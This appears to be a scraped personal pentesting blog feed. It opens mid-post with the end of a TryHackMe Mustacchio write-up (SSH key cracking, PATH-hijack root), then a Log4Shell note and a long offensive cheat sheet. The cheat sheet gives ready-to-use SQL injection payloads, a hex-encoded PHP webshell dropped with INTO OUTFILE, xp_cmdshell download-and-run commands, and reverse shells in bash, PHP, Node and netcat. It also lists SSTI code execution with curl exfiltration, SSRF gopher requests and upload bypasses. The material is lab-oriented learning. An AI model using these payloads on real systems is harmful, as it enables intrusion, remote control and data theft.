private key. Now let\u0026rsquo;s try logging in.\nFirst we need to change the permission for the private key. chmod 600 \u0026lt;private-key\u0026gt;\nThen try to use it for ssh. ssh -i \u0026lt;private-key\u0026gt; barry@\u0026lt;machine-ip\u0026gt;\n┌──(all3n㉿kali)-[~/thm/mustacchio] └─$ ssh -i sshkey barry@10.10.129.75 Enter passphrase for key \u0026#39;sshkey\u0026#39;: Looks like we need a passphrase for this. We can try using ssh2john to create a hash and then bruteforce using john\n┌──(all3n㉿kali)-[~/thm/mustacchio] └─$ /usr/share/john/ssh2john.py sshkey \u0026gt; sshkey.hash We should now have a sshkey.hash. Now we can run john against this file.\n──(all3n㉿kali)-[~/thm/mustacchio] └─$ john --wordlist=../rockyou.txt sshkey.hash 1 ⨯ Using default input encoding: UTF-8 Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64]) Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes Cost 2 (iteration count) is 1 for all loaded hashes Will run 2 OpenMP threads Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status \u0026lt;redacted\u0026gt; (sshkey) 1g 0:00:00:00 DONE (2022-01-19 22:54) 1.041g/s 3094Kp/s 3094Kc/s 3094KC/s urieljr..urielitho0 Use the \u0026#34;--show\u0026#34; option to display all of the cracked passwords reliably Session completed. Now we should have the passphrase. And should be able to ssh as barry.\nbarry@mustacchio:~$ ls user.txt ROOT Now I tried to download linpeas.sh from my box but it does not seem to work. so I looked for other users in the box instead and found joe user.\nNavigating to joe\u0026rsquo;s home directory shows a live_log file. Which looks like an executable file.\nbarry@mustacchio:/home/joe$ file live_log live_log: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=6c03a68094c63347aeb02281a45518964ad12abe, for GNU/Linux 3.2.0, not stripped I tried to execute it and it shows me some logs for when I browse to the port 8765 web server. I ran the strings command to see if there\u0026rsquo;s anything interesting, and I noticed this line which matches the output of the live_log file. Basically it runs the tail -f command against the /var/log/nginx/access.log file.\nFrom here we can also notice the it has a SUID bit. which executes the file as root when we run it.\n-rwsr-xr-x 1 root root 16832 Jun 12 2021 live_log Now we can try gaining Privilege escalation using Path Variable. linux priv esc using path variable\nLet\u0026rsquo;s go to /tmp.\nCreate a tail file with /bin/bash as its contents.\nbarry@mustacchio:/tmp$ ls tail barry@mustacchio:/tmp$ cat tail /bin/bash barry@mustacchio:/tmp$ chmod +x tail Now that we have our tail command that will execute /bin/bash when called. We will then need to change our $PATH variable, to do this:\nbarry@mustacchio:/tmp$ export PATH=/tmp:$PATH This command will add /tmp to our original $PATH so that when you run which tail it should go to /tmp first and run our malicious tail before checking other paths.\nNow let\u0026rsquo;s run live_log\nbarry@mustacchio:/home/joe$ ./live_log root@mustacchio:/home/joe# cd /root root@mustacchio:/root# ls root.txt And we are root!\n","permalink":"https://blog.allenxd.com/posts/mustacchio/","summary":"\u003cp\u003eA TryHackMe machine that covers XXE vulnerability to read sensitive user info like ssh-keys, this machine also covers some basic hash cracking while the privilege escalation will use a Path Variable vulnerability in a log_monitoring program.\u003c/p\u003e","title":"Mustacchio - TryHackMe"},{"content":"The widely-used java logging library, Log4j, has an unauthenticated remote code execution (RCE) and denial of service vulnerability if a user-controlled string is logged. This could allow the attacker full control of the affected server or allow an attacker to conduct a denial of service attack.\nLog4shell Setting up LDAP server using Marshalsec Marshalsec Github\njava -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer \u0026quot;https://10.10.10.10:8888/#log4jrce\u0026quot; Payload ${jndi:ldap://10.10.14.2:1337/a} ${jndi:ldap://10.10.14.2:1337/${sys:java.class.path} or ${java:version} or ${java:os}} or can be replaced with \u0026hellip;. to do nested thingy Creating serialized payload using ysoserial ysoserial ysoserial-modified\njava -jar ysoserial-modified.jar CommonsCollections5 bash 'bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.6/9002 0\u0026gt;\u0026amp;1' \u0026gt; ~/htb/logforge/ysoserial.ser Creates a serialized payload Set up JNDI Listener using JNDI-Exploit-Kit JNDI-exploit-kit\njava -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -L 10.10.14.6:1389 -P ~/htb/logforge/ysoserial.ser Listens to port 1389 then sends ysoserial.ser after running ysoserial-modified we will get links for different versions for jdk to try out. ${jndi:ldap://10.10.14.6:1389/vojbuj} Using ysoserial setup a JRMPListener that automatically sends CommonsCollections5 payload Using JRMPListener to send CommonsCollections java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 1337 CommonsCollections5 \u0026quot;**_CMD_**\u0026quot; this will set up a listener listening on port 1337. send your payload ${jndi:rmi://10.10.10.10:1337/a} and should receive something. Example Class public class Log4jRCE { static { try { String [] cmd={\u0026#34;touch\u0026#34;, \u0026#34;/tmp/TEST\u0026#34;}; java.lang.Runtime.getRuntime().exec(cmd).waitFor(); }catch (Exception e){ e.printStackTrace(); } } } ","permalink":"https://blog.allenxd.com/posts/log4j/","summary":"\u003cp\u003eThe widely-used java logging library, Log4j, has an unauthenticated remote code execution (RCE) and denial of service vulnerability if a user-controlled string is logged. This could allow the attacker full control of the affected server or allow an attacker to conduct a denial of service attack.\u003c/p\u003e","title":"Log4Shell"},{"content":"Samba What to do if samba port is open?\nCheck for usernames enum4linux -a 10.10.10.10 Smbclient smbclient -L //10.10.10.10 smbclient -L //10.10.10.10 -N No password (SMB Null session) smbclient --no-pass -L 10.10.10.10 smbclient //10.10.10.10/share_name nmap -script=smb-vuln\\* -p445 192.168.103.40 Smbmap smbmap -H 10.10.10.10 smbmap -H 10.10.10.10 -u '' -p '' smbmap -H 10.10.10.10 -s share_name CrackMapExec crackmapexec smb 10.10.10.10 -u '' -p '' --shares crackmapexec smb 10.10.10.10 -u 'sa' -p '' --shares crackmapexec smb 10.10.10.10 -u 'sa' -p 'sa' --shares crackmapexec smb 10.10.10.10 -u '' -p '' --share share_name SQLi Nice cheatsheet from hofmannsven\nWhen testing remember to try different comments -- - #\nSELECT name, description FROM products WHERE id=9; \u0026mdash; queries the db for name and desc in product table where id=9 SELECT -column list- FROM -table- WHERE -condition-\nExample vulnerable code\n$id = $_GET['id'];\n\u0026quot;SELECT name, desc FROM productes WHERE ID='$id';\u0026quot;;\n'a OR 'a'='a\nSELECT name, desc FROM products WHERE ID='' OR 'a'='a';\nUnion SELECT \u0026lt;statement\u0026gt; UNION \u0026lt;other\u0026gt; SELECT statement;\nSELECT name, description FROM Products WHERE ID='3' UNION SELECT username, password FROM accounts\nWith group_concat \u0026mdash; use when there\u0026rsquo;s only 1 column? and sql is only showing the first entry\n0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one' sqli_one = db\n0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users'\nstaff_users = table\nsingle column concat ' UNION SELECT username || '~' || password FROM users-- 1 UNION SELECT null,null,null,flag from exercise.secrets where flag is column, exercise is db, secrets is table \u0026gt; null,null,null,null cause 4 columns\nSorting can the app sort stuff? inject! delete value of param, inject stuff Boundary Testing same as sorting order by 5 Error Based Payloads sqlwiki netspi\nMSSQL cast(@@version as integer) 1+AND+8671+IN+(SELECT+(CHAR(0)%2b(SELECT+(CASE+WHEN+(8671%3d8671)+THEN+(SELECT+STRING_AGG(flag,+',')+from+exercise.information_schema.columns+where+TABLE_NAME+=+'secrets') Postgresql cast(version() as integer) MYSQL extractvalue('',concat('\u0026gt;',version())) Oracle to_char(dbms_xmlgen.getxml('select \u0026quot;'|| (select substr(banner,0,30) from v$version where rownum=1)||'\u0026quot; from sys.dual')) Stacked Queries asc;select+flag+from+flags; adding another query after the param value asc 1;WAITFOR DELAY '0:0:5'-- for postgresql ;SELECT+PG_SLEEP(5)-- Boolean (SELECT (CASE WHEN (4255=4255) THEN 1 ELSE (SELECT 9369 UNION SELECT 1823) END)) Reading and Writing Files Postgresql To read a file and then save to a table create table tmp(data text); copy tmp from '/etc/passwd'; select * from tmp; Alternative is select pg_read_file('/etc/passwd') MYSQL Check if mysql is configured to read all files SELECT @@GLOBAL.secure_file_priv; this will return what folder we have access to. If output is null meaning it is disabled and we can read anything. To write a file use into outfile SELECT * FROM users INTO OUTFILE '/var/lib/mysql-files/test.txt' The file location must be writable to the OS user the database software is running as. The /var/lib/mysql-files is the output of SELECT @@GLOBAL.secure_file_priv I have a note of into outfile in ReadME.md To read the file use load_file() SELECT LOAD_FILE('/var/lib/mysql-files/test.txt') Blind SQLi / Manual Bruteforce select substring(user() , 1, 1) = 'r';\n' or substr (user(), 1, 1)= 'a\nadmin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%';\nadmin123' UNION SELECT 1,2,3 where database() like 's%';--\nadmin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name='users';--\nadmin123' UNION SELECT 1,2,3 from users where username like 'a%\nBlind SQL in a cookie TrackingId=xyz'||(SELECT '' FROM dual)||' test on cookie header TrackingId is a cookie\n'||(SELECT Case When (1=1) then to_char(1/0) else '' end FROM dual)||'\n'||(SELECT Case When (1=1) then to_char(1/0) else '' end FROM users where username='administrator') ||'\n'||(SELECT Case When (1=1) then to_char(1/0) else '' end FROM users where username='administrator' and lenght(password)\u0026gt;1) ||'\n'||(SELECT Case When (1=1) then to_char(1/0) else '' end FROM users where username='administrator' and substr(password,1,1)='a') ||'\nLimit output of rows = rownum=1 \u0026mdash;same as Limit 1 for mysql This is syntax is for oracle - Dual is a default table\nupdating entry UPDATE wp_users SET user_pass=\u0026quot;5f4dcc3b5aa765d61d8327deb882cf99\u0026quot; where id=1 What to do when there is a confirmed injection point?\nDetermine how many columns using: ' UNION SELECT null;-- - or by using ORDER BY #\u0026ndash; -\n' UNION SELECT 'asd', 'asd';-- - asd should appear somewhere\nNOTE Check if it accepts string or integer\nAfter enumerating the number of columns continue with Union injections Querying Version, db, Table_name, user() 1 union select 1, @@version, 3, 4\n1 union select 1, database(), 3, 4\n1 union select 1, table_name, 3, 4 fomr information_schema.tables\n1 union select 1, column_name, 3, 4 fomr information_schema.columns\n' UNION SELECT user(), 'asd';-- -\nOne column available get username and password or group_concat maybe?\n'+UNION+SELECT+NULL,username||'~'||password+FROM+users--\nUploading Shell SQLi \u0026lt;value\u0026gt;' INTO OUTFILE '/var/www/html/shell.php' LINES TERMINATED BY 0x3C3F706870206563686F20223C7072653E22202E207368656C6C5F6578656328245F4745545B22636D64225D29202E20223C2F7072653E223B3F3E-- - INTO OUTFILE '/var/www/html/shell.php output file to shell.php /var/www/html most common default location 0x3C3F706870206563686F20223C7072653E22202E207368656C6C5F6578656328245F4745545B22636D64225D29202E20223C2F7072653E223B3F3E Hex of \u0026lt;?php echo \u0026quot;\u0026lt;pre\u0026gt;\u0026quot; . shell_exec($_GET[\u0026quot;cmd\u0026quot;]) . \u0026quot;\u0026lt;/pre\u0026gt;\u0026quot;;?\u0026gt; or hex of the actual php reverse shell from pentest monkey sqli RCE MSsql xp_cmdshell takes a string and passes it to a cmd shell for execution Disabled by default If DB user has appropriate permissions we can enable xp_cmdshell using EXECUTE sp_configure \u0026#39;show advanced options\u0026#39;, 1; GO RECONFIGURE; GO EXECUTE sp_configure \u0026#39;xp_cmdshell\u0026#39;, 1; GO RECONFIGURE; GO MSSQL xp_cmdshell If xp_cmdshell is enabled call it using EXECUTE xp_cmdshell 'command to run here'; Linux does not support several functions If DB user has appropriate permissions we can enable xp_cmdshell using the ff: EXECUTE sp_configure 'xp_cmdshell',1; RECONFIGURE; enables xp_cmdshell then EXEC xp_cmdshell 'curl http://192.168.48.2:8000/a.sh'; EXEC xp_cmdshell 'bash a.sh'; In order of usage\nEXECUTE sp_configure 'show advanced options',1; RECONFIGURE; EXECUTE sp_configure 'xp_cmdshell',1; RECONFIGURE; EXEC xp_cmdshell 'curl http://192.168.48.2:8000/itworked'; confirm RCE using this EXEC+xp_cmdshell+'curl+http://192.168.48.2:8000/RevShell.java+--output+%temp%/RevShell.java'; for windows EXEC xp_cmdshell 'java %temp%/RevShell.java'; for windows dont forget to url encode the % - To allow advance options to be changed. EXECUTE sp_configure \u0026#39;show advanced options\u0026#39;, 1; GO - To update the currently configured value for advance options. RECONFIGURE; GO - To enable xp_cmdshell EXECUTE sp_configure \u0026#39;xp_cmdshell\u0026#39;, 1; GO - To update currently config value for xp_cmdshell RECONFIGURE; GO example index.php?id=7%20UNION%20SELECT%20*%20from%20flags%20INTO%20OUTFILE%20%27/var/www/html/shell.php%27%20LINES%20TERMINATED%20BY%200x3C3F706870206563686F20223C7072653E22202E207368656C6C5F6578656328245F4745545B22636D64225D29202E20223C2F7072653E223B3F3E;--%20- SQLMap cheatsheet\nsqlmap -u \u0026lt;URL\u0026gt; -p \u0026lt;injection parameter\u0026gt; [options]\nsqlmap -u \u0026quot;http://test.site/view.php?id=1\u0026quot; -p id --technique=U technique used is Union\nsqlmap -u \u0026quot;http://test.site/view.php?id=1\u0026quot; --tables\nsqlmap -u \u0026quot;http://test.site/view.php?id=1\u0026quot; --current-db \u0026lt;dbname\u0026gt; -columns\nsqlmap -u \u0026quot;http://test.site/view.php?id=1\u0026quot; --current-db \u0026lt;dbname\u0026gt; --dump\nsqlmap -u \u0026quot;http://test.site/view.php?id=1\u0026quot; -D \u0026lt;dbname\u0026gt; -T \u0026lt;tablename\u0026gt; -C \u0026lt;Column\u0026gt; --dump1\nsqlmap -u http://target/whatever --method POST --data \u0026quot;db=mysql\u0026amp;name=asd\u0026amp;sort=id\u0026amp;order=asc\u0026quot; -p \u0026quot;name,sort,order\u0026quot;\n-p parameters to test with from --data --data post body sqlmap -u http://attack/whatever --method POST --data \u0026quot;db=mysql\u0026amp;name=asd\u0026amp;sort=id\u0026amp;order=asc\u0026quot; -p \u0026quot;name,sort,order\u0026quot; --dbms=mysql --dump\n--dbms specify what dbms in use --dump dump all contents of all tables in the db For Post Params/data\nsqlmap -u \u0026lt;URL\u0026gt; --data=\u0026lt;POST STRING\u0026gt; -p \u0026lt;PARAMETER\u0026gt; [options]\nSometimes you don\u0026rsquo;t need the \u0026rsquo;\nid=1 OR 1=1\nNoSQLi MongoDB PayloadAlltheThings\ndefault port is 2701 mongo to start - show databases, use whatever db.createCollection(\u0026quot;users\u0026quot;) , db.users.insert({id:\u0026quot;1\u0026quot;, username: \u0026quot;admin\u0026quot;, email: \u0026quot;admin@test.test\u0026quot;, password: \u0026quot;password\u0026quot;}) , db.users.find() , db.users.update({id:\u0026quot;2\u0026quot;}, {$set: {username: \u0026quot;test\u0026quot;}}); .bson supports json username[$eq]=admin\u0026amp;password[$ne]=asd collections = tables, documents = rows, fields = columns $and = AND, $or = OR $eq = matches records that equal to a certain value $ne = matches records that are not equal to a certain value $gt = matches records that are greater than a certain value. $where = matches records based on Javascript condition $exists = matches records that have a certain field $regex = matches records that satisfy certain regular expressions. mongo mongodb://admin:pass@192.168.120.186:27017/ Bruteforcing Basic Auth hydra -L user.txt -P rockyou.txt \u0026lt;machine-ip\u0026gt; http-head /\nhydra -L user.txt -P rockyou.txt \u0026lt;machine-ip\u0026gt; http-get /\nSMB hydra -L user.txt -P rockyou.txt -m \u0026lt;domain\u0026gt; \u0026lt;ip\u0026gt; smb or metasploit\nFTP hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt 192.168.120.161 ftp\nTCPdump Monitor your injections with tcpdump Ping yourself and run tcpdump -i \u0026lt;interface\u0026gt; icmp\nPivoting/PortForwading/Tunneling Used msfconsole muti/handler Therennox YOTF writeup\nSocat Opening 8888 in the victim to connect to victim 22 in this scenario only localhosts is allowed to victim 22\n/tmp/socat tcp-listen:8888,reuseaddr,fork tcp:localhost:22\nread more here Muirlandoracle YOTF writeup or H0j3n\u0026rsquo;s\nReverse Shell Relay ./socat tcp-l:8000 tcp:ATTACKING_IP:443 \u0026amp;\ntcp-l:8000 = used to create the first half of the connection \u0026ndash; ipv4 listener on tcp port 8000 of the victim tcp:attacking_ip:443 = connects back to our local IP on port 443 \u0026amp; = backgrounds the listener This will connect back to our machine so we need to setup a netcat listener\n./nc-hyst 127.0.0.1 8000 -e /bin/bash\nPort Forwarding using Socat ./socat tcp-l:33060,fork,reuseaddr tcp:172.16.0.10:3306 \u0026amp;\nWatch IPPSEC ProxyChains proxy a netcat proxychains nc 172.16.0.10 23\nwhen using nmap w/ proxychains comment out proxy_dns inside the proxychains.conf file\nonly tcp scan will work\nudp, syn and ping scan wont work - use -Pn\nPort Forwarding Local: From attacker to victim via SSH\nAttacker \u0026ndash;ssh\u0026ndash;\u0026gt; 172.16.0.5 \u0026ndash;http\u0026ndash;\u0026gt; 172.16.0.10\nssh -L 8000:172.16.0.10:80 user@172.16.0.5 -fN / ssh -i key -L 9000:10.10.10.75:80 10.10.10.73 f = backgrounds shell immediately N = tells SSH that it doesn;t need to execute any command and just set up the connection Now we can access the webserver on 172.16.0.10 using our own box localhost:8000 Use this when victim-localhost has open port that is only accessible by victim-localhost itself\nReverse Connection When doing this to avoid reverse shell and to only allow port forwarding add command=\u0026quot;echo 'This account can only be used for port forwarding'\u0026quot;,no-agent-forwarding,no-x11-forwarding,no-pty at the beginning of the public key.\nWe have a shell on victim(05) and we want to use it as a reverse connection from our machine(20) to webserver_victim(10)\nssh -R 8000:172.16.0.10:80 kali@172.16.0.20 -i KEYFILE -fN Plink.exe for Windows Command Line version of PuTTY SSH Client\nReverse Connection from Victim to our Attacker Machine. .20 Attacker \u0026mdash; .05 Victim we have a shell from \u0026mdash; .10 Webserver\ncmd.exe /c echo y | .\\plink.exe -R 8000:172.16.0.10:80 kali@172.16.0.20 -i KEYFILE -N For the keyfile we need to convert it using puttygen tool\nputtygen KEYFILE -o OUTPUT_KEY.ppk Reverse SSH Tunnel Use when port is only accessible by victim local\nssh -L 4444:10.10.125.232:8080\n4444 port of victim you will access from outside 10.10.125.232 victim\u0026rsquo;s ip 8080 local port you want to access inside the victim Web APP! Authentication Check created cookie is it a hashed value of user? change admin exist? try registering Admin add space before and after admin redirects to /login.php from / try intercepting response and change 302 Not Found to 200 OK Blacklisted? is X-Forwarded-For header allowed? Check timing might be different for username enumeration, make password extra long then check response time Blacklisted after a few tries? try alternating correct creds with bruteforced creds Valid users gets locked out Can be used to enum valid users PHP juggling bug send password as an array username=admin\u0026amp;password[]= Code looks like this if(strcmp($_REQUEST['password'], $password) == 0) in the backend PHP compares input from a hardcoded string or db. 2FA Manually access /account-page when asked for 2fa? might be able to bypass Password Reset bypasses Use X-Forwarded-Host header. X-Forwarded-Host: your-exploit-server-id.web-security-academy.net REMOVE HTTPS log should show unique token for the victim SAML b64decode SAMLResponse - Important Part is \u0026lt;NameID\u0026hellip;\u0026gt; Start SAML interaction \u0026gt; Intercept SAMLResponse \u0026gt; Tamper SAMLResponse \u0026gt; Forward Malicious SAMLResponse to SP Base64 Decode SAMLResponse \u0026gt; Change \u0026lt;NameID..youremail\u0026gt; to \u0026lt;NameID..adminemail\u0026gt; Outh2 CSRF vulnerabilities Authorization IDOR Can\u0026rsquo;t IDOR directly? try in Edit, Delete, Modify etc. add .json extension? Object with multiple attributes when signing up user[username]=evo\u0026amp;user[password]=evo\u0026amp;submit=Submit maybe add user[admin]=true or 1? admin can also be exchanged to other stuff like organisation_id etc whatever is in use to bypass Authorization Code Injection Test with ' \u0026quot; in every params just like sql. Some might give an error. we want it to error out then add a concat character(depends on what is used by website) example \u0026quot;+\u0026quot; for ruby. Or \u0026quot;\u0026quot; maybe. NOTE:REMEMBER TO URL ENCODE + %2b Errors out with \u0026quot;? try example.com/?test=evo\u0026quot;.system(\u0026quot;id\u0026quot;).\u0026quot; . is used to concat in PHP when website is sorting via PHP try to input ' or \u0026quot; again PHP version below 5 - Notice /pattern/? inject to /pattern/e then insert command phpinfo() to verify \u0026lsquo;.phpinfo().\u0026rsquo; - replace phpinfo() with system(\u0026ldquo;id\u0026rdquo;) or what ever command Ruby + for concat command inside ` Perl . for concat command inside ` Python Sethsec + for concat str(os.popen(\u0026quot;ls\u0026quot;).read()) str(__import__('os').system('id')) str(__import__('os').popen('id').read()) str(__import__('os').popen(__import__('base64').base64decode('\u0026lt;command in base64\u0026gt;')).read()) Check browser network if it\u0026rsquo;s loading any injectable params Command Injection Try all characters for chaining commands PayloadAlltheThings\nStraight out try backtick reverse shell or ping backtick or $(\u0026lt;command\u0026gt;) PayloadAlltheThings\ntry adding ; \u0026amp; | || at the end of the command aswell. EX: email=all3n@evo.test|sleep+5|\nthere\u0026rsquo;s a script in etc\nblind and can\u0026rsquo;t get a shell? maybe there\u0026rsquo;s a writable directory /images? whoami\u0026gt;/var/www/images\nwe can use the semicolon (;), the logical AND (\u0026amp;\u0026amp;), the logical OR (||), and even a single pipe character (|)\nIn addition to the semicolon, which allows us to chain multiple commands together in one statement, another unique separator for Linux is the newline (\\n)\nURL encode. USE BURP.\nUse null statement $()\nThis technique also works for more complex payloads like nc -nlvp 9090, which becomes: n$()c -n$()lvp 9090 Convert to base64 then decode\necho+'Y2F0IC9ldGMvcGFzc3dkCg==+'|+base64+-d if no base64 use openssl Check for the following:\nLinux\nWindows\nNode.js reverse shell echo \u0026quot;require('child_process').exec('nc -nv 192.168.49.51 9090 -e /bin/bash')\u0026quot; \u0026gt; /var/tmp/offsec.js ; node /var/tmp/offsec.js //tried with payloads in payload all the things but does not work needs the \u0026gt; /var.... part at the end\nPHP php -r '$sock=fsockopen(\u0026quot;192.168.49.51\u0026quot;,9090);exec(\u0026quot;/bin/sh -i \u0026lt;\u0026amp;3 \u0026gt;\u0026amp;3 2\u0026gt;\u0026amp;3\u0026quot;);' php -r instructs php to run the command in quotes $sock=fsockopen(\u0026quot;192.168.49.51\u0026quot;,9090);exec(\u0026quot;/bin/sh -i \u0026lt;\u0026amp;3 \u0026gt;\u0026amp;3 2\u0026gt;\u0026amp;3\u0026quot;); $sock=fsockopen(\u0026quot;192.168.49.51\u0026quot;,9090) establish a tcp socket to our attacker machine ;exec(\u0026quot;/bin/sh -i \u0026lt;\u0026amp;3 \u0026gt;\u0026amp;3 2\u0026gt;\u0026amp;3\u0026quot;); will call the function exec if phpninfo() is available check for disable_functions and Document_root This worked for the year of the fox challenge Client side filtering for symbols - used burp to bypass filtering\n\u0026quot;target\u0026quot;:\u0026quot;\\\u0026quot; ; echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC40LjE0LjUxLzcwMDMgMD4mMQ== | base64 -d | bash; echo\\\u0026quot;\u0026quot; this is a post request inside a search function \\ escapes the \u0026quot; character\nDirectory Traversal ../../../../../../../etc/passwd try reading the php file with the parameter ex: file.php?file=/var/www/file.php If it loads blank maybe it requires you to start with specific directory. ex: this one requires to start with /var/www file.php?file=/var/www/../../../../../etc/passwd add %00 at the end ../../../../../etc/passwd%00 fixed in php version 5.3.4 try /etc/passwd without the ../../../../ ....//....//....//....//....//etc/passwd url encode = %2E%2E%2F double url encode = %252E%252E%252F File Inclusion Loads php files - look for something like ?page=index.php try injecting a ' or \u0026quot; if it errors out Normal Directory traversal will work Try injecting remote sites like http://www.google.com or your own controlled site /?page=http://evohaxthepla.net/test.txt\u0026amp;cmd=id test.txt contains a php one liner look for the following in the source code: include require include_once require_once php://filter/resource=/etc/passwd php://filter/convert.base64-encode/resource=/etc/passwd LFI to RCE via Log files include a malicious payload into services log files such as Apache, SSH, etc. then request log file via LFI Example, a user can include a malicious payload into an apache log file via User-Agent or other HTTP headers. In SSH, the user can inject a malicious payload in the username section. echo '\u0026lt;?php echo 'whatever ';system($_GET['cmd']);?\u0026gt;' \u0026gt; whatever.php LDAP Test with ) if you\u0026rsquo;ll get an error PayloadAllthethings In a post request when signing in remove the whole post body ex: username=asd\u0026amp;password=asd delete this whole data. adm*))%00 admin)(cn=*))%00\u0026amp;password=admin Open Redirect PayloadAllthethings\nwebhook.site can be used to test? http and https is filtered can be bypassed by just doing //google.com check payloadallthethings for more CSRF What to look for?\nno csrf token, no samesite attribute on the cookie Remove CSRF token SameSite=Lax prevents CSRF Change POST to GET CSRF token is not user specific Intercept CSRF thru proxy then drop it - use the intercepted CSRF token on the other account check if it works SSRF Owasp\nBasically look for areas where the victim sends a request or downloads from another location ex: assets.test.com. And then try accessing localhost or other payloads. PayloadAllthethings Gopher gopher%3a//localhost%3a80/XPOST%2520/api/admin/create%2520HTTP/1.1%250aContent-Length%3a%252029%250aContent-Type%3a%2520application/x-www-form-urlencoded%250a%250ausername%3dhyst2%26password%3dhyst2 manually add %20 for spaces and %0a for new lines then urlencode the wholething try file:/// and all other methods aws 169.254.169.254 google cloud metadata.google.internal file:///c:/windows/win.ini file:///etc/passwd curl gopher://127.0.0.1:9000/_GET%20/hello_gopher%20HTTP/1.1 SSTI Nice labs from PortSwigger Look for injectable parameters and then fuzz - PayloadAllthethings has a good wordlists. Check template statements like ex: dropdown where you can choose if you want to display firstname, Lastname etc. try to break out of the template statement firstname}}{{7*7 Port Swigger Tornado lab in portswigger this worked {{2*2}}{%+import+os+%25}{{os.system('whoami')}} hacktricks ex: {% import os %}{{ os.popen(\u0026quot;whoami\u0026quot;).read() }} After finding a vulnerable parameter and determining what template engine is used. go to PayloadAlltheThings to check for code executions. Templating Engine Language Server/client Side Twig PHP Server Side Freemarker Java Server Side Pug/Jade JavaScript Mostly Server Side Jinja Python Server Side Handlebars JavaScript Both Mustache Multiple Varies Twig \u0026lt;h1\u0026gt;\u0026lt;?php echo $name ?\u0026gt;\u0026lt;/h1\u0026gt; \u0026lt;p\u0026gt;Welcome to our site!\u0026lt;/p\u0026gt; \u0026lt;?php if ($isAdmin) { echo \u0026#34;\u0026lt;p\u0026gt;You are the supreme leader and we love you\u0026lt;/p\u0026gt;\u0026#34;; } ?\u0026gt; {{7*7}} {{7*'7'}} both are ok = 49 Usually look for filter with =\u0026gt; they can be used with system {{['cat flag.txt']|map('system')}} {{[0]|reduce('system','curl http://192.168.49.51/helloFromTheOtherSide')}} {% set output %} // used to exfill whoami from a form usigng craft cms {{[0]|reduce(\u0026#39;system\u0026#39;,\u0026#39;whoami\u0026#39;)}} {% endset %} {% set exfill= output| url_encode %} {{[\u0026#39;curl http://192.168.49.191/a?exfill=\u0026#39; ~ exfill]|map(\u0026#39;system\u0026#39;)}} Freemarker \u0026lt;h1\u0026gt;Hello ${name}!\u0026lt;/h1\u0026gt; // INTERPOLATION $ \u0026lt;#if name == \u0026#34;hacker\u0026#34;\u0026gt; //FTL TAG starts with # The top reasons you\u0026#39;re great: \u0026lt;#list reasons as reason\u0026gt; ${reason?index + 1}: ${reason} \u0026lt;/#list\u0026gt; \u0026lt;/#if\u0026gt; more prone to xss as sometimes html is not escaped \u0026lt;i\u0026gt;a\u0026lt;/i\u0026gt; ${7*7} ok ${7*'7'} not ${\u0026quot;freemarker.template.utility.Execute\u0026quot;?new()(\u0026quot;whoami\u0026quot;)} Pug (jade) PAYLOAD GENERATOR h1 Hello, #{name} input(type=\u0026#39;hidden\u0026#39; name=\u0026#39;admin\u0026#39; value=\u0026#39;true\u0026#39;) if showSecret - secret = [\u0026#39;❤️\u0026#39;,\u0026#39;😍\u0026#39;, \u0026#39;🤟\u0026#39;] p The secrets are: each val in secret p #{val} else p No secret for you! Commonly integrated with Express framework in a Nodejs app #{name} child_process.spawnSync executes commands (is not accessible by default need to require) can be checked by = require if no access use = global.process.mainModule.require PAYLOAD\n- var require = global.process.mainModule.require = require(\u0026#39;child_process\u0026#39;).spawnSync(\u0026#39;whoami\u0026#39;).stdout // will result to [object Object] without .spawnSync Jinja \u0026lt;h1\u0026gt;Hey {{ name }}\u0026lt;/h1\u0026gt; {% if reasons %} Here are a couple of reasons why you are great: \u0026lt;ul\u0026gt; {% for r in reasons %} \u0026lt;li\u0026gt;{{r}}\u0026lt;/li\u0026gt; {% endfor %} \u0026lt;/ul\u0026gt; {% endif %} {{5*\u0026quot;5\u0026quot;}} = 55555 {{config|pprint}} Handlebars / Mustache \u0026lt;h1\u0026gt;Hello {{name}}\u0026lt;/h1\u0026gt; {{#if nicknames}} Also known as: {{#each nicknames}} {{this}} {{/each}} {{/if}} We are using handlebars locally in your browser to generate this template Mustache is logic-less only supports if statements Mustache is too restrictive thats why handlebars was created. check if Handlebars uses helpers specially read and readdir {{read \u0026quot;/etc/passwd\u0026quot;}} {{#each (readdir \u0026#34;/etc\u0026#34;)}} {{this}} {{/each}} Craft CMS SSTI vulnerable sprout forms plugin blind ssti TPLMap Python2 only Snowscan usage of TPLmap on OZ HTB - Snowscan File Upload PayloadAlltheThings\nChange Content-Type For Apache web servers try uploading .htaccess with the following contents AddType application/x-httpd-php .l33t this will allow the extension .l33t and treat it as php. Learned from portswigger lab (although .phtml worked in their lab xD) add nullbyte and check if the web app strips the nullbyte and .jpg at the end. magic bytes upload a normal image strip some of the contents leave the magic bytes at the beginning then append your payload. or exiftool -Comment=\u0026quot;\u0026lt;?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?\u0026gt;\u0026quot; \u0026lt;YOUR-INPUT-IMAGE\u0026gt;.jpg -o polyglot.php Race condition? for fileuploads that checks for viruses etc. might have a small window that we can execute a php payload. use turbo intruder. Portswigger Lab XXE PayloadAlltheThings\nCheck white spaces - only one newline from header!\nInformit XML structure\nDelete % from payloads you get in PayloadAlltheThings.\nif xml needs the \u0026lt;\u0026gt; as text xml needs to be enclosed in a CDATA section\nTesting for XXE\n\u0026lt;?xml version=\u0026#34;1.0\u0026#34; ?\u0026gt; 